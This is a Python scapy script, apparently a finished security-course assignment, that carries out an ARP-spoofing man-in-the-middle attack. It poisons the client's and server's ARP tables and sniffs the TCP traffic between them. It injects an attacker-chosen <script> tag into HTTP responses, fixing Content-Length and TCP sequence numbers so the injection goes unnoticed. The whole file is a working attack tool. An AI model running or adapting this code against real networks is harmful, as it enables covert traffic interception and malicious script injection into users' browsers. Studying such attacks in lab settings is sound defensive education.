from logging import error
import traceback
from scapy.all import *
import argparse
import os
import re
import sys
import threading
import time

MAX_SIZE = 1448


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface",
                        help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP",
                        help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP",
                        help="IP of the server", required=True)
    parser.add_argument(
        "-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity",
                        help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    result = sr1(ARP(op="who-has", pdst=IP), verbose=False)
    return result.hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval=3):
    while True:
        # TODO: Spoof client ARP table
        spoof(serverIP, attackerMAC, clientIP, clientMAC)
        # TODO: Spoof server ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC)
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    send(ARP(op='is-at', psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC))


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(op='is-at', psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC))


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverIP, serverMAC, attackerIP, attackerMAC
    mac_map = {clientIP: clientMAC, serverIP: serverMAC}
    if packet[Ether].src == attackerMAC:
        return
    if packet.haslayer(IP):
        packet[Ether].src = attackerMAC
        packet[Ether].dst = mac_map.get(packet[IP].dst, packet[Ether].dst)
        ipsrc = packet[IP].src
        ipdst = packet[IP].dst
        try:
            if packet.haslayer(TCP):
                if ipsrc == serverIP and ipdst == clientIP:
                    packets = fake_response(packet)
                    for p in packets:
                        sendp(p)

                elif ipsrc == clientIP and ipdst == serverIP:
                    packet = fake_request(packet)
                    if packet:
                        sendp(packet)
        except Exception as e:
            print("XXXXX")
            print(type(e))
            print(traceback.format_exc())


def fake_request(packet):
    """
    fake request from attacker to server (cuz sent extra byte, should not let server know)
    """
    global tcp_logs
    tcp = packet[TCP]
    if tcp.sport not in tcp_logs.keys():
        tcp_logs[tcp.sport] = TCPLog()

    tcp.ack -= tcp_logs[tcp.sport].insert_len

    if tcp_logs[tcp.sport].extra_packet == 1:
        tcp_logs[tcp.sport].extra_packet += 1
        packet.ack += tcp_logs[tcp.sport].extra_len
        tcp_logs[tcp.sport].extra_len = 0
    elif tcp_logs[tcp.sport].extra_packet == 2:
        tcp_logs[tcp.sport].extra_packet = 0
        return []

    if tcp_logs[tcp.sport].finished == 2:
        del tcp_logs[tcp.sport]
    elif tcp.flags.F:
        tcp_logs[tcp.sport].finished += 1
    print(f'{tcp.sport:} c->s:{tcp.flags} {tcp.ack}, {tcp.seq}')

    clean_old_field(packet)
    return packet


def fake_response(packet):
    """
    @input: packet from serverIP to clientIP
    @return: list of modified packets 
    """
    global tcp_logs, attackerMAC
    tcp = packet[TCP]
    # setup insert script
    insert_script = '<script>' + script + '</script>'
    insert_len = len(insert_script)
    if tcp.dport not in tcp_logs.keys():
        tcp_logs[tcp.dport] = TCPLog()
    packet.seq += tcp_logs[tcp.dport].insert_len
    if packet.haslayer(Raw):
        raw_pack = packet[Raw]
        original_length = len(raw_pack.load)
        payload = raw_pack.load.decode('utf-8')
        if tcp.dport not in tcp_logs.keys():
            tcp_logs[tcp.dport] = TCPLog()
        # try to change length
        length_idx = payload.find("Content-Length:")
        length_end_idx = payload.find('\r\n', length_idx)
        if length_idx != -1 and length_end_idx != -1:
            old_len = int(payload[length_idx:length_end_idx].split(':')[1])
            new_len = str(old_len + insert_len)
            payload = payload[:length_idx] + "Content-Length: " + \
                new_len + payload[length_end_idx:]
            tcp_logs[tcp.dport].insert_len += len(payload) - original_length

        # try to insert script

        new_payload = payload.replace('</body>', insert_script+'</body>')
        if len(new_payload) <= MAX_SIZE:
            if new_payload != payload:
                tcp_logs[tcp.dport].insert_len += insert_len
            packet[Raw] = Raw(new_payload)
        else:  # !!! extra packet needed
            payload_full = new_payload[:MAX_SIZE]
            payload_extra = new_payload[MAX_SIZE:]
            packet[Raw] = Raw(payload_full)
            tcp_logs[tcp.dport].extra_packet = 1
            tcp_logs[tcp.dport].extra_len = len(payload_extra)
            packet_extra = Ether(src=attackerMAC) \
                / IP(src=packet[IP].src, dst=packet[IP].dst) \
                / TCP(sport=packet[TCP].sport,
                      dport=packet[TCP].dport,
                      flags='A',
                      seq=packet.seq + MAX_SIZE,
                      ack=packet.ack) \
                / Raw(load=payload_extra.encode('utf-8'))
            clean_old_field(packet)
            packets = [packet, packet_extra]
            tcp_logs[tcp.dport].insert_len += insert_len
            return packets

    if packet[TCP].flags.F:
        tcp_logs[tcp.dport].finished += 1

    clean_old_field(packet)
    print(f'{tcp.dport:} s->c: {tcp.flags}{tcp.ack}, {tcp.seq}')

    return [packet]


def clean_old_field(packet):
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum


def create_packets(tcp_log, client_port):
    # variable declaration
    pass


class TCPLog:  # server side info
    def __init__(self, insert_len=0, finished=0, extra_packet=0, extra_len=0) -> None:
        self.insert_len = insert_len
        self.finished = finished
        self.extra_packet = extra_packet
        self.extra_len = extra_len


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0  # minimize scapy verbosity
    conf.iface = args.interface  # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    script = args.script
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)
    tcp_logs = {}
    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(
        clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(
        target=sniff, kwargs={'prn': interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
